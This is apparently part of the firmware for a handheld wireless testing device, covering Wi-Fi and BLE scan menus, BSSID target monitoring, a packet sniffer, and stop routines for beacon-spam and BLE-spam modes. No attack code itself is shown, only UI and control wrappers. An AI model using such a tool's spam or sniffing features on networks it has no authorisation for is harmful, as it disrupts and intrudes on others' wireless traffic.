int hexValue(char value) {
  if (value >= '0' && value <= '9') return value - '0';
  if (value >= 'A' && value <= 'F') return value - 'A' + 10;
  if (value >= 'a' && value <= 'f') return value - 'a' + 10;
  return -1;
}

// ─────────────────────────────────────────────────────────────
//  Target helpers
// ─────────────────────────────────────────────────────────────

void runTargetRefresh() {
  if (!targetHasSelection()) {
    showPlaceholder("Re-scan", "No target set yet");
    return;
  }

  char targetBssid[18];
  strncpy(targetBssid, targetGet().bssid, sizeof(targetBssid));
  targetBssid[sizeof(targetBssid) - 1] = '\0';

  if (!labStatsActive() || strcmp(labStatsGet().bssid, targetBssid) != 0) {
    labStatsReset(targetBssid);
  }

  ledYellowOn();
  uiDrawStatus("Scanning for target...");

  bool scanOk   = wifiScannerScan();
  int foundIndex = scanOk ? wifiScannerFindBssid(targetBssid) : -1;

  ledYellowOff();

  if (foundIndex >= 0) {
    targetSet(wifiScannerNetwork(foundIndex));
    labStatsAdd(true, &targetGet());
    selectedNetwork = foundIndex;
    selectedBand    = wifiScannerIs5GHz(targetGet().channel) ? 5 : 2;
    uiState = UI_TARGET_MONITOR;
    uiDrawTargetMonitor(targetGet(), true);
    ledFlashGreen(1, 120);
    buzzerScanDone();
  } else {
    labStatsAdd(false, NULL);
    uiState = UI_TARGET_MONITOR;
    uiDrawTargetMonitor(targetGet(), false);
    ledFlashRed(1, 120);
  }

  labStatsPrintToSerial();
  delay(250);
}

bool sameTarget(uint8_t networkIndex) {
  if (!targetHasSelection()) return false;
  return strcmp(targetGet().bssid, wifiScannerNetwork(networkIndex).bssid) == 0;
}

void showPlaceholder(const char *title, const char *message) {
  uiState = UI_PLACEHOLDER;
  uiDrawStatus(title);
  delay(500);
  uiDrawStatus(message);
}

// ─────────────────────────────────────────────────────────────
//  WiFi scan
// ─────────────────────────────────────────────────────────────

void runScan() {
  setLedMode(LED_MODE_SCANNING);
  uiDrawStatus("Scanning...");

  selectedNetwork = 0;
  listTop = 0;

  if (!wifiScannerScan()) {
    setLedMode(LED_MODE_IDLE);
    ledFlashRed(2, 100);
    buzzerError();
    uiDrawStatus("Scan failed");
    delay(1200);
    drawMainMenu();
    return;
  }

  // Scan end: 3 green blink
  ledAllOff();
  ledFlashGreen(3, 100);
  setLedMode(LED_MODE_IDLE);
  
  buzzerScanDone();

  selectedNetwork = 0;
  listTop = 0;
  uiState = UI_NETWORK_LIST;
  uiDrawNetworkListAll(selectedNetwork, listTop);
}

// ─────────────────────────────────────────────────────────────
//  Index / scroll helpers
// ─────────────────────────────────────────────────────────────

uint8_t nextIndex(uint8_t current, uint8_t count) {
  return (current + 1) % count;
}

uint8_t previousIndex(uint8_t current, uint8_t count) {
  return current == 0 ? count - 1 : current - 1;
}

uint8_t nextBandOption(uint8_t current) {
  return current == 5 ? 2 : 5;
}

void moveSelectionAll(int delta) {
  int total = (int)wifiScannerCount();
  if (total == 0) {
    uiDrawStatus("Scanning...");
    runScan();
    return;
  }

  int itemCount = total + 1; // +1 for [ Back ]

  if (delta > 0) {
    selectedNetwork = (selectedNetwork + 1) % itemCount;
  } else {
    selectedNetwork = (selectedNetwork - 1 + itemCount) % itemCount;
  }

  if (selectedNetwork >= 0 && selectedNetwork < listTop)
    listTop = selectedNetwork;
  if (selectedNetwork >= listTop + UI_MENU_VISIBLE)
    listTop = selectedNetwork - (UI_MENU_VISIBLE - 1);
  if (listTop < 0) listTop = 0;

  uiDrawNetworkListAll(selectedNetwork, listTop);
  delay(150);
}

void selectFirstNetworkInBand() {
  selectedNetwork = -1;
  listTop = 0;
  for (uint8_t i = 0; i < wifiScannerCount(); i++) {
    if (wifiScannerNetworkInBand(i, selectedBand)) {
      selectedNetwork = i;
      listTop = i;
      break;
    }
  }
  uiState = UI_NETWORK_LIST;
}

void normalizeListTop() {
  if (selectedNetwork == -1) {
    for (uint8_t i = 0; i < wifiScannerCount(); i++) {
      if (wifiScannerNetworkInBand(i, selectedBand)) { listTop = i; return; }
    }
    listTop = 0;
    return;
  }
  if (selectedNetwork < listTop) { listTop = selectedNetwork; return; }
  uint8_t rows = 0;
  for (uint8_t i = listTop; i < wifiScannerCount(); i++) {
    if (!wifiScannerNetworkInBand(i, selectedBand)) continue;
    rows++;
    if ((int)i == selectedNetwork) return;
    if (rows >= 4) { listTop = selectedNetwork; return; }
  }
}

// ─────────────────────────────────────────────────────────────
//  BLE list navigation
// ─────────────────────────────────────────────────────────────

void moveBleSelection(int delta) {
  int total = (int)bleCount();
  if (total == 0) { selectedBleDevice = -1; return; }

  if (delta > 0) {
    if (selectedBleDevice < total - 1) selectedBleDevice++;
    else                               selectedBleDevice = -1;
  } else {
    if (selectedBleDevice == -1) selectedBleDevice = total - 1;
    else if (selectedBleDevice > 0) selectedBleDevice--;
    else                            selectedBleDevice = -1;
  }

  if (selectedBleDevice >= 0 && selectedBleDevice < bleListTop)
    bleListTop = selectedBleDevice;
  if (selectedBleDevice >= bleListTop + 4)
    bleListTop = selectedBleDevice - 3;
  if (bleListTop < 0) bleListTop = 0;

  uiRefreshBleList(selectedBleDevice, bleListTop);
  delay(150);
}

// ─────────────────────────────────────────────────────────────
//  Exit / close helpers
// ─────────────────────────────────────────────────────────────

void closeBleAnalyzer() {
  bleStop();
  bleMarkStackStopped();
  drawBleMenu();
}

void closeBleScanList() {
  bleStop();
  bleMarkStackStopped();
  drawBleMenu();
}

void exitBeaconSpam() {
  beaconSpamStop();
  ledYellowOff();
  drawMainMenu();
}

void exitBleSpam() {
  bleSpamStop();
  ledYellowOff();
  drawBleMenu();
}

void exitWifiAnalyzer() {
  sniffStop();
  ledYellowOff();
  drawMainMenu();
}

void exitSniffer() {
  sniffStop();
  ledYellowOff();
  drawMainMenu();
}

void startSniffer(uint8_t band) {
  if (sniffStart(band)) {
    uiState = UI_SNIFFER;
    uiDrawSniffer(sniffGetStats());
    ledYellowOn();
  } else {
    showPlaceholder("Sniffer", "Failed to start");
    buzzerError();
  }
}





